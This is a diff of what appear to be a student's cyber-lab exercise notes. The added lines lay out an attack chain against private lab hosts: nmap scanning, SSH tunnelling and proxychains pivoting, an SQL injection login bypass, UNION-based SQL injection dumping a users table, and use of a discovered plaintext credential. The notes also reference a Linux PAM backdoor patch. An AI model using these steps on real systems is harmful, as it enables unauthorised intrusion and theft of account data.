@@ -210,13 +210,35 @@ https://github.com/zephrax/linux-pam-backdoor/blob/master/backdoor.patch
 10.50.39.115  Public Facing Website
 ssh -X student@10.50.22.28
 START LINOPS
-1. nmap -Pn 10.50.29.115 -p- -T4
-2. nmap -v -sT -Pn -T4 --script discovery 10.50.29.115 -T4
+1. nmap -Pn 10.50.39.115 -p- -T4
+2. nmap -v -sT -Pn -T4 --script discovery 10.50.39.115 -T4
+3. ssh student@localhost -L 3001:10.50.29.115:80 -NT
+4. open firefox
+      localhost:3001
+      go to the login page
+            joe' OR 1='1    # for username and password
+                  Welcome Aaron
+      navigate through directories
+      /scripts
+            development.py
+                  user2:EaglesIsARE78
+5. ssh user2@10.50.39.115 -L 3001:localhost:22 -NT
+6. cat /etc/hosts
+      192.168.28.181
+7. ssh -p 3001 user2@localhost -D 9050 -NT
+      proxychains nmap -Pn 192.168.28.181 -T4
+8. proxychains nmap -v -sT -Pn -T4 --script discovery 192.168.28.181 -T4
+9. firefox
+10. ssh -p 3001 user2@localhost -L 3002:192.168.28.181:80 -NT
+11. select the last radio button and start with the golden standard
+      http://localhost:3002/pick.php?product=7 UNION select table_schema,table_name,column_name FROM information_schema.columns
+      # do this in every product=# until it works
+12 http://localhost:3002/pick.php?product=7 UNION SELECT user_id,name,username FROM users
+13. using cyberchef use ROT13 to decode
+FROM PUBLIC FACING 
+14.  ssh Aaron@192.168.28.172 
 
-
-
-
-
+      
 
 
 
